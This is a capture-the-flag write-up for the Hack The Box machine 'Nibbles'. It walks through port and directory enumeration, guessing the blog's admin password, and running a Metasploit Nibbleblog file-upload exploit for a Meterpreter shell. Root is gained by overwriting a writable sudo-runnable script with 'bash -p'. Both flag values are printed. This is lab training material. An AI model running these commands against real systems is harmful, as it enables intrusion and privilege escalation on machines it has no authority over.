# [nibbles](https://app.hackthebox.com/machines/121) | Cyanyde

Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.

## Recon I

### nmap

`sudo nmap -A <target ip> -T5 -vv -oN nibblescan`

- We can use nmap to enumerate service versions and other basic information
- The following port information is returned:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Manual Testing

- We use *curl* to get the source of the webpage(s) being served on port 80 from the target
    - `curl http://<target ip>`
    - There is a line in the output that says `<!-- /nibbleblog/ directory. Nothing interesting here! -->`
    - Naturally, we should `curl http://<target ip>/nibbleblog/` next
- The /nibbleblog/ directory has a much more fleshed out HTML page
- Opening the page in a web browser brings us to a blog page titled **Nibbles Yum yum**
- There is an exploit available for Nibbleblog [here](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/)
    - Taking a look at the page, there is a metasploit module that allows us to use this

## Exploitation I

- `msfconsole` to open Metasploit
- `search nibbleblog` to find the module
- `use <module number>` or `use exploit/multi/nibbleblog_file_upload`
- Looking at the options for the exploit, we see that we must supply our own username and password, so we need to go back and find credentials we can use for our exploit

## Recon II

- Used a tool like *gobuster* to fuzz for other subdirectories
- `gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`
- These are some interesting subdirectories I found:
    - /README - does not resolve
    - /admin - accessible; is a browsable directory
    - /admin.php - accessible; is a login page
    - /content - accessible; is a browsable directory
    - /index.php - accessible; is the original page we are served when visiting /nibbleblog/
    - /languages - accessible; directory listing of .bit files
    - /plugins - accessible; browsable directory
    - /themes - accessible; browsable directory
- /nibbleblog/content/private/
    - Contains a users.xml file
        - Opening it shows that *admin* is a registered user
        - It also shows the parameters for a blacklist, which suggests that our IP will be added to the blacklist if our fail count gets too high
- Let's go back to the login page we found at nibbleblog/admin.php and try a few credentials
    - Trying out a few combinations with *admin* as the username eventually leads us to nibbles, which gets us into the admin portal

## Exploitation II

- With these credentials, I can go back and use the Metasploit module
- `show options` to see required parameters
- `set RHOST <target ip>`
- `set LHOST <your ip>`
- `set USERNAME admin`
- `set PASSWORD nibbles`
- `set TARGETURI /nibbleblog/`
- `run`

I now have a Meterpreter shell in the system.

## Post-Exploitation

- I am looking for a user.txt flag, so I'll navigate to the user home directory at `/home/nibbler/`

>  <details><summary>The directory contains a <code>user.txt</code> with our flag: </summary>79c03865431abf47b90ef24b9695e148</details>

### Privilege Escalation

- I want to get a root flag next, so I'll explore some avenues of privilege escalation
- `sudo -l` to show me what I can run as sudo with the nibbler account
    - For some reason, I can run monitor.sh with no password
    - I also have write access to this file
- I'm going to go ahead and use `echo >` to replace the file's contents with my own
    - Using `echo usermod -aG sudoers nibbler > monitor.sh` I can effectively make the file execute a command that needs sudo rights, giving myself root access
        - The sudoers group does not exist
    - If I `cat /etc/group` I can see a list of groups on the system
    - I use the same method and instead add myself to the group *root*
    - This seems to also not work because there is no TTY
- Let me instead `echo 'bash -p'` to `monitor.sh`
    - Running this as sudo gives me root access
- I can then simply `cd /root` and there is a root.txt within that directory

>  <details><summary><code>root.txt</code> contains: </summary>de5e5d6619862a8aa5b9b212314e0cdd</details>

